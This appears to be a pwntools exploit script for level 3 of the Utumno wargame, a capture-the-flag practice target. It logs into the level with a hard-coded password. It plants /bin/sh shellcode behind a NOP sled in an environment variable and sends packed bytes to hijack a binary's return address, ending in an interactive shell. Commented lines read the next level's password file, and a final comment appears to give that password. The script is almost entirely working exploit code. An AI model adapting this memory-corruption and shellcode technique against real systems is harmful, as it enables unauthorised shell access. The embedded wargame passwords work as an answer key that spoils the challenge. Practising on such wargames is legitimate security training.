from lib.exploit import *
import time




LEVEL = "3"

# s = connect_to_local(LEVEL, "zuudafiine", remote=False)
s = connect(LEVEL, "zuudafiine")
from lib.exploit import *



remote_payload_file = CWD + "payload"

s.process(["rm", "-rf", CWD]).recvall()
s.process(["mkdir", CWD]).recvall()
# upload(s, gdb_script, CWD + "gdb.script")

log.info("%s " % process("gcc -no-pie -m32 reverse.c -o reverse", cwd="/home/kali/PycharmProjects/utumno/3/reverse", shell=True).recvall())
log.info("%s " % process(["chmod", "a+x", "/home/kali/PycharmProjects/utumno/3/reverse/reverse"]).recvall())


def get_char_index_values(start_index, amount_chars):
    return process(["/home/kali/PycharmProjects/utumno/3/reverse/reverse", str(start_index), str(amount_chars)]).recv(numb=amount_chars)


def jump_to_adr(adr):
    payload = b""
    payload += asm(pwnlib.shellcraft.i386.push(adr))
    payload += asm(pwnlib.shellcraft.i386.ret())
    # jmp eax
    # payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('eax', adr)))
    # payload += b"\xff\xe0"
    return payload


def execute(s, index_chars, payload, env_payload):
    assert len(payload) == len(index_chars)
    # io = s.process([BINARY_PATH], env={"gil": env_payload})
    io = s.process(["wrapper", env_payload], cwd=CWD)
    for i in range(len(index_chars)):
        xored_index_val = index_chars[i]
        overflow_val = payload[i]
        append_to_remote_file(s, pack(xored_index_val, 8), remote_payload_file)
        append_to_remote_file(s, pack(overflow_val, 8), remote_payload_file)
        upload(s, env_payload, CWD+"env_payload")
        io.send(pack(xored_index_val, 8))
        io.send(pack(overflow_val, 8))
    # trick to do when shellcode just exists instead of spawning shell
    io.send(b"\n"*9)
    return io


remote_wrapper = CWD+"wrapper"
wrapper_src = read("./3/wrapper.cpp")
upload(s, wrapper_src, CWD+"wrapper.cpp")
log.warn("%s " % s.process(["gcc", "-m32", "-no-pie", "wrapper.cpp", "-o", "wrapper"], cwd=CWD).recvall())
log.info("%s " % s.process(["chmod", "a+x", remote_wrapper], cwd=CWD).recvall())




# padding = bytes(cyclic(4, alphabet=string.ascii_uppercase), "utf-8")
# libc_base = 0xf7e12000
# binsh_adr = libc_base + next(libc.search(b"/bin/sh"))
# # system_adr = libc_base + libc.symbols["system"]
# execl_adr = libc_base + libc.symbols["execl"]
#
# log.info("binsh_adr: " + hex(binsh_adr))
# # log.info("system_adr: " + hex(system_adr))
env_var_adr = 0xffffdef3
# tiny_sh = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

pw_file = CWD+"pw"
# log.info("%s " % s.process("echo \"\" > " + pw_file, shell=True).recvall())


env_payload = b""
env_payload += b"\x90"*200
env_payload += asm(shellcraft.i386.linux.sh())
# env_payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.open(pw_file)))
# env_payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.linux.cat("/etc/utumno_pass/utumno4", 3)))
# env_payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.linux.readfile("/etc/utumno_pass/utumno4", 'esi')))
# env_payload += pwnlib.encoders.encoder.null(asm(shellcraft.i386.mov('esi', 3)))

payload = pack(env_var_adr+100, 32)


log.info(f"payload: {payload}")
log.info(f"payload len: {len(payload)}")

log.info(f"env_payload: {env_payload}")


# exit(1)


index_chars = get_char_index_values(40, len(payload))
log.info(f"index_chars: {index_chars}")

io = execute(s, index_chars, payload, env_payload)
io.interactive()
# log.warn("%s" % io.recvall())

# oogieleoga